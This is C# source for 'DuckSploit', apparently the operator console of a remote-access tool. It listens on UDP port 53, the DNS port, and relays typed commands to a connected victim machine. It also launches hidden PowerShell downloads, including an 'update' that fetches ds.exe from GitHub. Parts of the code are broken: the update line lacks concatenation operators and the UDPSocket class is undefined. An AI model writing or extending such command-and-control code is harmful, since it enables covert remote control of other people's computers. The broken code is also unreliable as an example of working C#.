using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.IO.Compression;
using System.Web;
using System.Threading;
using System.Text.RegularExpressions;

namespace DSserver
{
    class Program
    {
		public static void sendmsg(string message, string color)
		{
			if (color == "red")
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "green")
			{
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "yellow")
			{
				Console.ForegroundColor = ConsoleColor.Yellow;
				Console.WriteLine(message);
				Console.ResetColor();
			}
			else if (color == "blue")
			{
				Console.ForegroundColor = ConsoleColor.Blue;
				Console.WriteLine(message);
				Console.ResetColor();
			}
		}
		public static void sendmsgnonewline(string message, string color)
		{
			if (color == "red")
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "green")
			{
				Console.ForegroundColor = ConsoleColor.Green;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "yellow")
			{
				Console.ForegroundColor = ConsoleColor.Yellow;
				Console.Write(message);
				Console.ResetColor();
			}
			else if (color == "blue")
			{
				Console.ForegroundColor = ConsoleColor.Blue;
				Console.Write(message);
				Console.ResetColor();
			}
		}
		public static string gethtmlcode(string url)
		{
			string tempdir = Path.GetTempPath(); 
			try
			{
				File.Delete(tempdir + "last.txt");
			}
			catch (Exception e)
			{
				// nothin'
			}
			
			string callcommand = "(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + tempdir + "/last.txt')";
			
			ProcessStartInfo processInfo;
			Process process;
			
			processInfo = new ProcessStartInfo("powershell.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();

			string path = tempdir + "/last.txt";
			string readText = File.ReadAllText(path);
			return readText;
			

			
		}
		public static void execpowershell(string cmd)
		{
			ProcessStartInfo processInfo;
			Process process;
			
			processInfo = new ProcessStartInfo("powershell.exe", cmd);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
		}
        static void Main(string[] args)
        {
			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
			string tempdir = Path.GetTempPath(); 
			string dir = userprofile + "/DuckSploit"; 
			if (! Directory.Exists(dir)) 
			{
				Directory.CreateDirectory(dir);
			}
			
            UDPSocket s = new UDPSocket();
            s.Server("0.0.0.0", 53);
			int a = 0;
			while(a == 0)
			{
				Console.WriteLine(" ");
				sendmsg("        dP                   dP                         dP          oo   dP   ", "green");
				sendmsg("        88                   88                         88               88   ", "green");
				sendmsg("  .d888b88 dP    dP .d8888b. 88  .dP  .d8888b. 88d888b. 88 .d8888b. dP d8888P ", "green");
				sendmsg("  88'  '88 88    88 88'   `` 88888'`  Y8ooooo. 88'  '88 88 88'  '88 88   88   ", "green");
				sendmsg("  88.  .88 88.  .88 88.  ... 88  '8b.       88 88.  .88 88 88.  .88 88   88   ", "green");
				sendmsg("  '88888P8 '88888P' '88888P' dP   'YP '88888P' 88Y888P' dP '88888P' dP   dP   ", "green");
				sendmsg("                                               88                              ", "green");
				sendmsg("                                               dP                              ", "green");
				sendmsg("                            | DuckSploit V1.0.8 |                         ", "green");
				
				// # Wait
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("1", "red");
				sendmsg("] Wait", "yellow");
				// # Open chat
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("2", "red");
				sendmsg("] Open chat", "yellow");
				// # Update
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("3", "red");
				sendmsg("] Update", "yellow");
				// # Visit website
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("4", "red");
				sendmsg("] Visit our website", "yellow");
				// # Exit
				sendmsgnonewline("    [", "yellow");
				sendmsgnonewline("5", "red");
				sendmsgnonewline("] Exit", "yellow");
				Console.WriteLine(" ");

				sendmsgnonewline("Choose option [", "green");
				sendmsgnonewline("1", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("2", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("3", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("4", "yellow");
				sendmsgnonewline(",", "red");
				sendmsgnonewline("5", "yellow");
				sendmsgnonewline("]: ", "green");
				
				string menu = Console.ReadLine(); 
				
				
				if(menu == "1")
				{
					a = 1;
					Console.ForegroundColor = ConsoleColor.Red;
					Console.Write("[");
					Console.ResetColor();
					Console.Write("*");
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("] Waiting for connection...");
					while(true)
					{
						if (s.connected)
						{
							string input2;
							Console.ForegroundColor = ConsoleColor.Green;
							Console.Write("DS> ");
							Console.ResetColor();
							
							input2 = Console.ReadLine();
							string[] input = input2.Split(' ');

							if(input[0] == "help")
							{
								sendmsg(gethtmlcode("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/help.txt"), "green");
							}
							else if(input[0] == "clear")
							{
								Console.Clear();

							}
							else if(input[0] == "cls")
							{
								Console.Clear();
							}
							else if(input[0] == "exit")
							{
								Console.Clear();
								sendmsg("[o] Exited from the console.", "red");
								break;
							}
							else if(input[0] == "credits")
							{
								sendmsg(gethtmlcode("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/credits.txt"), "green");
							}
							else
							{
								s.Send(input2);
							}
						}
					}
					s.close();
				}
				else if(menu == "2")
				{
					a = 1;
					Console.WriteLine("soon");
				}
				else if(menu == "3")
				{
					a = 1;
					File.Delete(userprofile + "DuckSploit/ds.exe");
					execpowershell("(New-Object System.Net.WebClient).DownloadFile('https://github.com/canarddu38/DUCKSPLOIT/raw/root/hacker/windows/ds.exe', '" userprofile "/ds.exe')");
				}
				else if(menu == "4")
				{
					a = 1;
					System.Diagnostics.Process.Start("https://canarddu38.github.io/DUCKSPLOIT/");
				}
				else if(menu == "5")
				{
					a = 1;
					Console.Clear();
					sendmsg("[o] Exited from the console...", "red");
				}
				else
				{
					Console.Clear();
					sendmsg("[x] Unknown awnser (only 1,2,3 or 4 are allowed)", "red");
				}
			}
        }
    }
}
